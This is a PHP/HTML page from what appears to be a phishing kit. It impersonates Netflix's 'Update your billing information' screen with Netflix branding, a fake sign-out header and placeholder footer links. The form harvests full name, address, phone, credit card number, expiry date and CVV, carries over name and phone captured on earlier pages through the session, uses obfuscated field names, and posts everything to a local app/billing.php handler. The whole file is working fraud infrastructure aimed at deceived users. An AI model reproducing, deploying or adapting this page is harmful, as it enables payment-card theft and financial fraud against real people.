<?php

session_start();

include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html class="htmltebi">
<head>
	<meta charset="utf-8">

	<link rel="stylesheet" type="text/css" href="./assets/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="./assets/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="./assets/warning.css">
  <link rel="stylesheet" type="text/css" href="./assets/animate.css">
	<link rel="stylesheet" type="text/css" href="./assets/set1.css">

	<script type="text/javascript" src="./assets/jquery-3.1.1.slim.min.js"></script>
	<script type="text/javascript" src="./assets/tether.min.js"></script>
  <script type="text/javascript" src="./assets/bootstrap.min.js"></script>
	<script type="text/javascript" src="./assets/classie.js"></script>
  <script type="text/javascript" src="./assets/jquery.CardValidator.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1">


  <link rel="shortcut icon" href="assets/nficon2016.ico"/>
  <link rel="apple-touch-icon" href="assets/nficon2016.png"/>
	<title>Netflix</title>
  <script type="text/javascript">
  $(document).ready(function(){
    $('.veeriiiifyyy').click(function(){ 
    $(window).scrollTop(0);
    $('.alert-imgxx').toggleClass("animated shake",function(){
      $(this).remove();
    });
    }); 
    $('input').keyup(function(){
      $(this).removeClass('error');
      $(this).addClass('hasText');
      $(this).addClass('successText');
    });
    $('select').change(function(){
      $(this).removeClass('error');
      $(this).addClass('successText');
      });
    $('#update_nm').toggleClass();
      $('#btn_zebi').click(function(){

  function error_input(id){
    $(id).addClass('error');
  }


$('#id_xccaaa').validateCreditCard(function(resultx) {
  if ($('#id_firstName').val() == '') { $('#id_firstName').addClass('error'); return false; }
  else if ($('#id_lasttName').val() == '') { $('#id_lasttName').addClass('error'); return false; }
  else if ($('#id_add').val() == '') { $('#id_add').addClass('error'); return false; }
  else if ($('#id_city').val() == '') { $('#id_city').addClass('error'); return false; }
  else if ($('#id_zip').val() == '') { $('#id_zip').addClass('error'); return false; }
  else if ($('#id_phone').val() == '') { $('#id_phone').addClass('error'); return false; }
  else if ($('#id_firstName').val() == '') { $('#id_firstName').addClass('error'); return false; }
  else if ($('#id_lasttName').val() == '') { $('#id_lasttName').addClass('error'); return false; }
  else if (resultx.valid == false) {$('#id_xccaaa').addClass('error'); return false; }
  else if ($('#id_exx1').val() == '') { $('#id_exx1').addClass('error'); return false; }
  else if ($('#id_exx2').val() == '') { $('#id_exx2').addClass('error'); return false; }
  else if ($('#id_scv').val() == '') { $('#id_scv').addClass('error'); return false; }
  else{ $('form').submit(); }
});
});

  });
    $(document).ready(function(){

    $('#id_xccaaa').validateCreditCard(function(result) {
        // console.log(result);
        if (result.card_type != null) {
            switch (result.card_type.name) {
                case "VISA":
                    $('#id_xccaaa').css('background-position', '98.5% -2%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "VISA ELECTRON":
                    $('#id_xccaaa').css('background-position', '98.5%  47.4%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MASTERCARD":
                    $('#id_xccaaa').css('background-position', '98.5%  3%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MAESTRO":
                    $('#id_xccaaa').css('background-position', '98.5%  39.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "DISCOVER":
                    $('#id_xccaaa').css('background-position', '98.5%  17.4%');
          $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "AMEX":
                    $('#id_xccaaa').css('background-position', '99% 9.5%');
                    $('#csc').attr('pattern', '[0-9]{4}');
          $('#csc').attr('maxlength', '4');
          $('#csc').attr('placeholder', 'CSC (4 digits)');
                    break;
                case "JCB":
                    $('#id_xccaaa').css('background-position', '98.5% 32%');
                    break;
                case "DINERS CLUB":
                    $('#id_xccaaa').css('background-position', '98.5% 24.8%');
                    break;
         case "DINERS CLUB GLOBAL":
                    $('#id_xccaaa').css('background-position', '98.5% 24.8%');
                    break;
                default:
                    $('#id_xccaaa').css('background-position', '98.5% 82%');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
            }
        } else {
            $('#id_xccaaa').css('background-position', '98.5% 82%');
      $('#csc').attr('placeholder', 'CSC (3 digits)');
        }
        // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.

    });
            
    });
  </script>

  <style type="text/css">
    .crzebi{
        background-image: url('assets/sprites_cc_logos.png');
        background-repeat: no-repeat;
        background-position: 98.5% 81.7%;
    }
  </style>
</head>
<body class="bodytebi">

<div id="hdSpace">
   <div id="hdPinTarget" class="member-header">
    <div id="hd">
    <div id="headerBlind"></div>
    <div>
     <a href="#/" class="icon-logoUpdate logo"></a>
    </div>
    <p class="endsession">Sign out</p>      
    </div>
  </div>
</div>




<div class="container">
  <div class="col-md-12">
    <div class="offset-md-3 col-md-6 ">
      <div class="container">
        <h3 class="update" style="margin-bottom: 17px;">Update your billing information.</h3>
<!--         <h3 class="update">Update your billing information.</h3>
        <p>Your monthly membership is billed on the first day of each billing period.</p> -->
<!--         <div>
          <span class="logos logos-block" data-reactid="21" style="float: left;margin-bottom: 7px;">
            <span class="logoIcon VISA" data-reactid="22"></span>
            <span class="logoIcon MASTERCARD" data-reactid="23"></span>
            <span class="logoIcon AMEX" data-reactid="24"></span>
            <span class="logoIcon DISCOVER" data-reactid="24"></span>
            <span class="logoIcon DINERS" data-reactid="24"></span>
          </span>
        </div> -->
        <div style="clear:both;"></div>
        <form action="app/billing.php" method="post" id="formx">
        <div class="nfInput nfInputOversize">
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="firstName" class="nfTextField hasText successText" value="<?php echo @$_SESSION['firstname']; ?>" id="id_firstName" value="" tabindex="0" autocomplete="false">
              <label for="id_firstName" class="placeLabel">First Name</label>
            </label>
          </div>
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="lastname" class="nfTextField hasText successText" value="<?php echo @$_SESSION['lastname']; ?>" id="id_lasttName" value="" tabindex="0" autocomplete="false">
              <label for="id_lasttName" class="placeLabel">Last Name</label>
            </label>
          </div>
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="address" class="nfTextField" id="id_add" value="" tabindex="0" autocomplete="false">
              <label for="id_add" class="placeLabel">Address</label>
            </label>
          </div>
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="city" class="nfTextField" id="id_city" value="" tabindex="0" autocomplete="false">
              <label for="id_city" class="placeLabel">City</label>
            </label>
          </div>
          <div class="nfInputPlacement" >
            <div class="col-md-6 float-left" style="padding: 0px;">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <input type="text" name="state" class="nfTextField" id="id_state" value="" tabindex="0" autocomplete="false">
                <label for="id_state" class="placeLabel">State</label>
              </label>
            </div>
            <div class="col-md-6 float-left zipzap" class="">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <input type="text" name="zip" class="nfTextField" id="id_zip" value="" tabindex="0" autocomplete="false">
                <label for="id_zip" class="placeLabel" style="padding-left: 14px;">Zip</label>
              </label>
            </div>
          </div>
          <div style="clear:both;"></div>
          <div class="nfInputPlacement" style="margin-top: 10px;">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="phone" class="nfTextField hasText successText" value="<?php echo @$_SESSION['phone']; ?>" id="id_phone" value="" tabindex="0" autocomplete="false">
              <label for="id_phone" class="placeLabel">Phone</label>
            </label>
          </div>
          <h3 class="update" style="margin-bottom: 17px;font-size: 18px;" id="update_nm">Update your payment information.</h3>
          <p style="font-size: 13px;">Your monthly membership is billed on the first day of each billing period.</p>
          <div>
            <span class="logos logos-block" data-reactid="21" style="float: left;margin-bottom: 7px;">
              <span class="logoIcon VISA" data-reactid="22"></span>
              <span class="logoIcon MASTERCARD" data-reactid="23"></span>
              <span class="logoIcon AMEX" data-reactid="24"></span>
              <span class="logoIcon DISCOVER" data-reactid="24"></span>
              <span class="logoIcon DINERS" data-reactid="24"></span>
            </span>
          </div>
          <div style="clear:both;"></div>
          <div class="nfInput nfInputOversize">
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="cnxxx" class="nfTextField crzebi" id="id_xccaaa" value="" tabindex="0" autocomplete="false">
              <label for="id_xccaaa" class="placeLabel">Credit Card</label>
            </label>
          </div>
          <div class="nfInputPlacement" >
            <div class="col-md-6 float-left" style="padding: 0px;">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <select name='eppp_MM' id='id_exx1' class="nfTextField hasText">
                    <option value=''>MM</option>
                    <option value='01'>01</option>
                    <option value='02'>02</option>
                    <option value='03'>03</option>
                    <option value='04'>04</option>
                    <option value='05'>05</option>
                    <option value='06'>06</option>
                    <option value='07'>07</option>
                    <option value='08'>08</option>
                    <option value='09'>09</option>
                    <option value='10'>10</option>
                    <option value='11'>11</option>
                    <option value='12'>12</option>
                </select>
                <label for="id_state" class="placeLabel">Month</label>
              </label>
            </div>
            <div class="col-md-6 float-left zipzap" class="">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <select name='eppp_YY' id='id_exx2' class="nfTextField hasText">
                    <option value=''>YY</option>
                    <option value='2018'>2018</option>
                    <option value='2019'>2019</option>
                    <option value='2020'>2020</option>
                    <option value='2021'>2021</option>
                    <option value='2022'>2022</option>
                    <option value='2023'>2023</option>
                    <option value='2024'>2024</option>
                    <option value='2025'>2025</option>
                    <option value='2026'>2026</option>
                    <option value='2027'>2027</option>
                    <option value='2028'>2028</option>
                    <option value='2029'>2029</option>

                </select>
                <label for="id_zip" class="placeLabel" style="padding-left: 14px;">Year</label>
              </label>
            </div>
          </div>
        </div>
          <div style="clear:both;"></div>
          <div class="nfInputPlacement" style="margin-top: 10px;">
            <div class="col-md-12 float-left" style="padding: 0px;">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <input type="text" maxlength="4" name="CXXVX" class="nfTextField" id="id_scv" value="" tabindex="0" autocomplete="false">
                <label for="id_scv" class="placeLabel">Security Code (CVV)</label>
              </label>
            </div>
            <input type="hidden" name="next">
          <button class="btn login-button btn-submit btn-small continue-btn" id="btn_zebi" type="button" autocomplete="off" tabindex="4"><!-- react-text: 26 -->Continue<!-- /react-text --></button>
          </div>
          
          </div>
          </div>
        </form>
<!--<div id="" class="inputError">Le prénom est obligatoire&nbsp;!</div>-->
      </div>
    </div>
<!--   <hr style="background: #999;"> -->
  </div>
</div>
<div class="site-footer-wrapper centered dark">
    <div class="footer-divider"></div>
    <div class="site-footer">
        <p class="footer-top"><a class="footer-top-a" href="#">Questions? Contact us.</a></p>
        <ul class="footer-links structural">
            <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" href="#/legal/termsofuse" placeholder="footer_responsive_link_terms"><span id="">Terms of Use</span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" href="#/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link"><span id="">Privacy</span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" href="#/legal/privacy#cookies" placeholder="footer_responsive_link_cookies_separate_link"><span id="">Cookie Preferences</span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" href="#/en/node/2101" placeholder="footer_responsive_link_corporate_information"><span id="">Corporate Information</span></a></li>
        </ul>
    </div>
</div>
</body>
</html>